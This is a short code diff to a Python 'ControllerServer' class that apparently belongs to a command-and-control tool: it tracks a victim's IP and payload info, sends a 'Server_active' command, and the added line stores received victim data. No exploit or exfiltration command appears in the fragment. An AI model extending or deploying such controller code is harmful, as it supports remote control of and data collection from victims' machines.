@@ -191,6 +191,7 @@ class ControllerServer:
                             or self.info_payload != info_payload):
                         self.ip_victim = ip_victim
                         self.info_payload = info_payload
+                        self.info_victim = data_str
                         self.send_command(message="Server_active")
                         if self.consoleMenu.options[1] == "continue":
                             self.consoleMenu.options[1] = f"{self.consoleMenu.pause_continue['Pause']}"
